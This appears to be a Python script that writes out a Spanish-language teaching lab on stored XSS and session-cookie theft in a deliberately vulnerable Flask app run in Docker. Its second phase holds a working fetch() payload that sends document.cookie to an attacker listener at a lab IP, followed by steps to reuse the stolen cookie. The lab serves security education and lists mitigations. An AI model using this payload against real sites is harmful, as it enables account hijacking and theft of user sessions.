@@ -1,0 +1,254 @@
+content = r"""# Laboratorio: Stored XSS y robo de sesiones mediante cookies
+
+## Objetivo del ejercicio
+
+En este laboratorio el alumno explota una vulnerabilidad de **stored XSS** en la sección de comentarios de una aplicación Flask vulnerable (Synapse) para robar la cookie de sesión del usuario `guest` y reutilizarla para autenticarse sin conocer sus credenciales.
+
+La infraestructura corre en Docker Compose e incluye:
+
+- `flask`: aplicación vulnerable.
+- `nginx`: proxy frontal publicado en `http://192.168.30.10`.
+- `victim`: contenedor con un navegador Playwright que simula a la víctima autenticada.
+
+---
+
+## Arquitectura relevante del lab
+
+### Servicios de Docker Compose
+
+```yaml
+version: '3.8'
+
+services:
+  flask:
+    image: python:3.11-slim
+    working_dir: /app
+    volumes:
+      - ./app:/app
+      - synapse-db:/opt/synapse
+    command: >
+      sh -c "pip install flask==3.0.0 -q &&
+             python init_db.py &&
+             python app.py"
+    restart: unless-stopped
+
+  nginx:
+    image: nginx:alpine
+    ports:
+      - "80:80"
+    volumes:
+      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf
+    depends_on:
+      - flask
+    restart: unless-stopped
+
+  victim:
+    image: mcr.microsoft.com/playwright/python:v1.58.0-noble
+    container_name: synapse_victim
+    working_dir: /app
+    volumes:
+      - ./victim:/app
+    command: sh -c "pip install --no-cache-dir playwright==1.58.0 && python victim.py"
+    depends_on:
+      - flask
+    restart: unless-stopped
+
+volumes:
+  synapse-db:
+```
+
+El servicio `victim` monta la carpeta `./victim` como `/app` y ejecuta `victim.py` dentro del contenedor.
+
+### Código del visitante simulado (victim.py)
+
+```python
+import time
+from playwright.sync_api import sync_playwright
+
+BASE = "http://nginx"
+USER = "guest"
+PASS = "guest123"
+
+
+def run():
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context()
+        page = context.new_page()
+
+        while True:
+            try:
+                print("[victim] visiting /login")
+                page.goto(f"{BASE}/login", wait_until="networkidle")
+
+                page.fill('input[name="username"]', USER)
+                page.fill('input[name="password"]', PASS)
+                page.click('button[type="submit"]')
+                page.wait_for_timeout(2000)
+
+                print("[victim] url after login:", page.url)
+                print("[victim] cookies after login:", context.cookies())
+
+                print("[victim] visiting /comments")
+                page.goto(f"{BASE}/comments", wait_until="networkidle")
+                print("[victim] url after comments:", page.url)
+                print("[victim] cookies before wait:", context.cookies())
+
+                page.wait_for_timeout(8000)
+            except Exception as e:
+                print("victim error:", e)
+
+            time.sleep(20)
+
+
+if __name__ == "__main__":
+    run()
+```
+
+Este bot:
+
+1. Abre `/login` a través del servicio `nginx`.
+2. Se autentica con el usuario `guest`.
+3. Comprueba las cookies generadas tras el login.
+4. Visita `/comments` periódicamente, simulando a la víctima que navega por la sección vulnerable.
+
+---
+
+## Fase 1: verificación de stored XSS
+
+### Paso 1.1 – Comentar sin autenticación
+
+La ruta `/comments` se ha dejado accesible sin sesión, de forma que cualquier usuario puede publicar comentarios. Esto permite que el atacante inserte contenido HTML/JS malicioso.
+
+### Paso 1.2 – Payload de prueba
+
+El alumno publica un comentario con el payload clásico de prueba:
+
+```html
+<script>alert(document.cookie)</script>
+```
+
+Al recargar `/comments` con una sesión válida en el navegador (por ejemplo, tras hacer login como `guest` en otro navegador o usando el bot), el popup muestra el contenido de `document.cookie`. Esto confirma dos cosas:
+
+- La aplicación es vulnerable a **stored XSS** en comentarios.
+- Las cookies de sesión **no** llevan la flag `HttpOnly`, por lo que pueden leerse desde JavaScript.
+
+---
+
+## Fase 2: exfiltración de la cookie de sesión
+
+### Paso 2.1 – Listener en la máquina del atacante
+
+En la máquina Parrot del atacante se levanta un listener HTTP sencillo:
+
+```bash
+python3 -m http.server 8000
+```
+
+Este servidor registra cualquier petición que llegue, incluyendo la query string. No es necesario que exista el recurso; el objetivo es ver la línea `GET` en la terminal.
+
+### Paso 2.2 – Payload de exfiltración
+
+Una vez validado el XSS, el alumno sustituye el comentario por un payload que envía `document.cookie` al listener:
+
+```html
+<script>
+fetch('http://10.0.40.5:8000/?c=' + encodeURIComponent(document.cookie) + '&t=' + Date.now());
+</script>
+```
+
+- `10.0.40.5` es la IP de la máquina Parrot vista desde la red del laboratorio.
+- El parámetro `c` contiene la cookie codificada.
+- `t=Date.now()` evita respuestas 304 de caché generando una URL única en cada petición.
+
+### Paso 2.3 – Ejecución por la víctima simulada
+
+Cuando el contenedor `victim` se autentica como `guest` y accede a `/comments`, el navegador Playwright ejecuta el script almacenado. Eso provoca que aparezcan en Parrot líneas como:
+
+```text
+192.168.30.10 - - [22/Apr/2026 22:03:55] "GET /?c=session%3D2%3Aguest%3Aguest&t=1776888235509 HTTP/1.1" 200 -
+```
+
+Decodificando la query string se obtiene:
+
+```text
+c = session=2:guest:guest
+```
+
+Es decir, el atacante ha robado la cookie de sesión del usuario `guest` sin conocer su contraseña.
+
+---
+
+## Fase 3: reutilización de la cookie robada (session hijacking)
+
+### Paso 3.1 – Preparar navegador atacante
+
+En un navegador distinto (o en ventana privada), el alumno abre:
+
+```text
+http://192.168.30.10/login
+```
+
+Sin autenticarse, abre las herramientas de desarrollo:
+
+- Firefox: pestaña **Storage** → `Cookies`.
+- Chrome: pestaña **Application** → `Cookies`.
+
+### Paso 3.2 – Inyectar la cookie
+
+Hay dos formas equivalentes.
+
+**Opción A – Desde la pestaña de Cookies**
+
+Crear o editar una cookie con:
+
+- Name: `session`
+- Value: `2:guest:guest`
+- Domain/Host: `192.168.30.10`
+- Path: `/`
+
+**Opción B – Desde la consola**
+
+En la consola del navegador:
+
+```javascript
+document.cookie = "session=2:guest:guest; path=/";
+```
+
+### Paso 3.3 – Verificación
+
+Tras recargar la página, el servidor reconoce al navegador atacante como si fuera `guest`. El alumno puede comprobarlo accediendo a rutas que solo deberían estar disponibles para usuarios autenticados (por ejemplo `/comments` o `/search`) sin pasar por el formulario de login.
+
+En este punto, el laboratorio ha demostrado un caso completo de **secuestro de sesión**:
+
+1. Vulnerabilidad stored XSS.
+2. Cookie de sesión sin `HttpOnly`.
+3. Exfiltración de `document.cookie`.
+4. Reutilización de la cookie en otro navegador.
+
+---
+
+## Puntos didácticos a remarcar en la memoria
+
+- **Separación de roles**: el alumno actúa siempre como atacante. El contenedor `victim` representa a la víctima real, de forma que no es necesario un segundo estudiante.
+
+- **Importancia de HttpOnly**: si la cookie de sesión tuviera la flag `HttpOnly`, el payload XSS no podría leerla con `document.cookie`, reduciendo el impacto de la vulnerabilidad (aunque no eliminándola por completo).
+
+- **Valor opaco de la sesión**: el servidor confía únicamente en el valor de la cookie `session`. Quien posea ese token puede suplantar al usuario correspondiente sin conocer sus credenciales.
+
+- **Cadena de explotación**: el ejercicio no se limita a disparar un `alert(1)`, sino que guía al alumno a través de todo el ciclo de ataque: inyección, ejecución en la víctima, robo de cookie y suplantación.
+
+---
+
+## Posibles extensiones
+
+En fases posteriores del TFG se puede encadenar esta fase con:
+
+- Explotación de SQLi en la ruta `/search` utilizando la sesión robada de `guest`.
+- Ejemplos de mitigación: sanitización del input en `/comments`, uso de plantillas sin `|safe`, establecimiento de cookies de sesión con `HttpOnly` y `Secure`, y adopción de CSP.
+"""
+
+with open('output/xss_session_hijack_lab.md', 'w', encoding='utf-8') as f:
+    f.write(content)
+
+'output/xss_session_hijack_lab.md'
